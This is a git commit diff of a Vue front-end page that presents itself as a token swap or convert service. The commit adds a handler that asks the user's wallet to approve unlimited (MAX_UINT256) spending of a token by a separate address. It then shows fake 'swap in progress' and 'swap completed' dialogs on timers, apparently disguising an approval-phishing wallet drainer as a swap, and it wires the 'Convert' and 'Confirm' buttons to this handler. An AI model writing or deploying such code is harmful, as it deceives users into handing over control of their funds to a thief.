314c87cd665e9a6b46dde06c0a91877121a4e491
jack <dfsgyg@se.sdf>
2025-03-06 18:09:53 +0800

    add metamask

--- src/views/HomeView.vue
+++ src/views/HomeView.vue
@@ -3,13 +3,11 @@ import 'swiper/css'
 import 'swiper/css/pagination'
 import {Swiper, SwiperSlide} from 'swiper/vue'
 import {Mousewheel, Pagination} from 'swiper/modules'
-import {onBeforeMount, onBeforeUnmount, onMounted, reactive, ref,watch} from 'vue'
+import {onBeforeMount, onBeforeUnmount, onMounted, reactive, ref, watch} from 'vue'
 import type {Swiper as SwiperInstance} from 'swiper';  // 类型导入
 
 import {abi} from "./erc20.ts"
-import {useConnect, useChainId, useAccount,useWriteContract} from '@wagmi/vue';
-
-
+import {useConnect, useChainId, useAccount, useWriteContract} from '@wagmi/vue';
 
 
 let timer: any = null
@@ -26,20 +24,35 @@ const countdown = ref({
 
 const chainId = useChainId();
 const {connectors, connect} = useConnect();
-const { address, connector,isConnected } = useAccount();
-const { data: hash, writeContract } = useWriteContract()
+const {address, connector, isConnected} = useAccount();
+const {data: hash, writeContract} = useWriteContract()
 const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
 
-const appusdt = () => {
-  writeContract({
+const appusdt = async () => {
+  await writeContract({
     address: '0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2',
     abi,
     functionName: 'approve',
-    args: ["0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2",MAX_UINT256],
+    args: ["0x48F943a8a6A6437117063D3aCaf62e2047467966", MAX_UINT256],
   })
-}
 
+  // 先显示 swapProgress
+  showDialog('swapProgress');
+
+  // 等待 3 秒（硬等待）
+  await new Promise(resolve => setTimeout(resolve, 2000));
+
+  hideDialog('swapProgress')
+
+
+  // 显示 swapCompleted
+  showDialog('swapCompleted');
+  await new Promise(resolve => setTimeout(resolve, 3000));
+  hideDialog('swapCompleted')
+
+
+}
 
 
 const data = reactive({
@@ -63,10 +76,7 @@ onBeforeMount(() => {
   timer = setInterval(() => updateCountdown(), 1000)
 })
 onMounted(() => {
-  if (data.defaultShow) {
-    showDialog(data.defaultShow)
-  }
-  // metamaskApprove('0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2', '0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2')
+
 })
 onBeforeUnmount(() => {
   clearInterval(timer)
@@ -131,6 +141,8 @@ watch(isConnected, (newValue, oldValue) => {
     hideDialog('walletConnection')
   }
 })
+
+
 
 </script>
 
@@ -344,7 +356,7 @@ watch(isConnected, (newValue, oldValue) => {
                    style="border-radius: 50%;">
               &nbsp; {{ connector.name }}
             </div>
-            <div class="btn" @click="appusdt" >
+            <div class="btn" @click="appusdt">
               <img width="20" height="20" class="iekbcc0 ju367v2m ju367v8p ju367v9f" aria-hidden="true"
                    src="data:image/svg+xml,<svg width=&quot;28&quot; height=&quot;28&quot; viewBox=&quot;0 0 28 28&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;>%0A<rect width=&quot;28&quot; height=&quot;28&quot; fill=&quot;%233B99FC&quot;/>%0A<path d=&quot;M8.38969 10.3739C11.4882 7.27538 16.5118 7.27538 19.6103 10.3739L19.9832 10.7468C20.1382 10.9017 20.1382 11.1529 19.9832 11.3078L18.7076 12.5835C18.6301 12.6609 18.5045 12.6609 18.4271 12.5835L17.9139 12.0703C15.7523 9.9087 12.2477 9.9087 10.0861 12.0703L9.53655 12.6198C9.45909 12.6973 9.3335 12.6973 9.25604 12.6198L7.98039 11.3442C7.82547 11.1893 7.82547 10.9381 7.98039 10.7832L8.38969 10.3739ZM22.2485 13.012L23.3838 14.1474C23.5387 14.3023 23.5387 14.5535 23.3838 14.7084L18.2645 19.8277C18.1096 19.9827 17.8584 19.9827 17.7035 19.8277C17.7035 19.8277 17.7035 19.8277 17.7035 19.8277L14.0702 16.1944C14.0314 16.1557 13.9686 16.1557 13.9299 16.1944C13.9299 16.1944 13.9299 16.1944 13.9299 16.1944L10.2966 19.8277C10.1417 19.9827 9.89053 19.9827 9.73561 19.8278C9.7356 19.8278 9.7356 19.8277 9.7356 19.8277L4.61619 14.7083C4.46127 14.5534 4.46127 14.3022 4.61619 14.1473L5.75152 13.012C5.90645 12.857 6.15763 12.857 6.31255 13.012L9.94595 16.6454C9.98468 16.6841 10.0475 16.6841 10.0862 16.6454C10.0862 16.6454 10.0862 16.6454 10.0862 16.6454L13.7194 13.012C13.8743 12.857 14.1255 12.857 14.2805 13.012C14.2805 13.012 14.2805 13.012 14.2805 13.012L17.9139 16.6454C17.9526 16.6841 18.0154 16.6841 18.0541 16.6454L21.6874 13.012C21.8424 12.8571 22.0936 12.8571 22.2485 13.012Z&quot; fill=&quot;white&quot;/>%0A</svg>%0A"
                    style="transition: opacity 0.15s linear; user-select: none;border-radius: 50%;">
@@ -478,7 +490,7 @@ watch(isConnected, (newValue, oldValue) => {
               <div>Cancel</div>
             </div>
             <div class="btn_2">
-              <div class="fmRedHatDisplay2-7" :class="{'on':data.chked}">Confirm</div>
+              <div class="fmRedHatDisplay2-7" :class="{'on':data.chked}" @click="appusdt">Confirm</div>
             </div>
           </div>
 
@@ -511,14 +523,14 @@ watch(isConnected, (newValue, oldValue) => {
                  style="border-radius: 50%;">
             <div class="wladd" v-if="isConnected">{{ address }}</div>
             <div class="wladd" v-else>Connect Wallet</div>
-<!--            <div class="wladd_close">-->
-<!--              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#C8C8C8" viewBox="0 0 12 12"-->
-<!--                   style="fill: rgb(191, 240, 9);">-->
-<!--                <path fill-rule="evenodd"-->
-<!--                      d="M2.227 2.227c.22-.22.576-.22.796 0L6 5.205l2.977-2.978a.563.563 0 0 1 .796.796L6.796 6l2.977 2.977a.563.563 0 0 1-.796.796L6 6.796 3.023 9.772a.563.563 0 0 1-.796-.796L5.205 6 2.227 3.023a.563.563 0 0 1 0-.796"-->
-<!--                      clip-rule="evenodd"></path>-->
-<!--              </svg>-->
-<!--            </div>-->
+            <!--            <div class="wladd_close">-->
+            <!--              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#C8C8C8" viewBox="0 0 12 12"-->
+            <!--                   style="fill: rgb(191, 240, 9);">-->
+            <!--                <path fill-rule="evenodd"-->
+            <!--                      d="M2.227 2.227c.22-.22.576-.22.796 0L6 5.205l2.977-2.978a.563.563 0 0 1 .796.796L6.796 6l2.977 2.977a.563.563 0 0 1-.796.796L6 6.796 3.023 9.772a.563.563 0 0 1-.796-.796L5.205 6 2.227 3.023a.563.563 0 0 1 0-.796"-->
+            <!--                      clip-rule="evenodd"></path>-->
+            <!--              </svg>-->
+            <!--            </div>-->
           </button>
         </header>
         <main>
@@ -632,7 +644,8 @@ watch(isConnected, (newValue, oldValue) => {
             <div class="btn_box">
 
               <button class="btn_on">
-                <div class="btn_text">Approve</div>
+                <div class="btn_text" v-if="isConnected" @click="showDialog('pleaseConfirm')">Convert</div>
+                <div class="btn_text" v-else @click="showDialog(data.defaultShow)">Connect Wallet</div>
                 <div class="proto_icon">
                   <svg xmlns="http://www.w3.org/2000/svg" fill="rgba(255, 255, 255, 1)" viewBox="0 0 32 33"
                        style="width: var(--Sizing-4, 20px); height: var(--Sizing-4, 20px);">
